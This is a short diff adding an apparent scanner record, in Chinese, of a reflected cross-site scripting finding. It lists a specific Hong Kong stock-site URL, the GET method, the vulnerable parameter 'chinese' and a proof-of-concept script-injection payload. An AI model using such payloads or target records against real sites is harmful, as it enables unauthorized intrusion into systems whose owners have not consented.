@@ -1,0 +1,5 @@
+检测网址 : http://00992.hkstock.inv.org.cn/?chinese=traditional
+提交方式 : GET
+漏洞参数 : chinese
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
